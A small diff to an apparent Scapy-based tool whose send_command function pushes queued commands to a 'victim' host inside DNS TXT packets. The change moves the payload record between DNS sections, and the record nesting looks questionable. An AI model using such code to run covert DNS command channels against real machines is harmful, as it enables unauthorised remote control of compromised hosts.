@@ -42,7 +42,7 @@ def send_command(ip_adr,vic_sport,get_qname):
     print("ip addr!")
     print(ip_adr)
     print(vic_sport)
-    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(rd=1,qd=DNSQR(qtype="TXT", qname=get_qname,an=DNSRR(rdata=combined))))
+    send(IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(rd=1,qd=DNSQR(qtype="TXT", qname=get_qname,ar=DNSRR(rdata=combined))))
     #pkt_send(pkt_no_data,combined,0)
 
     commands_que = ""
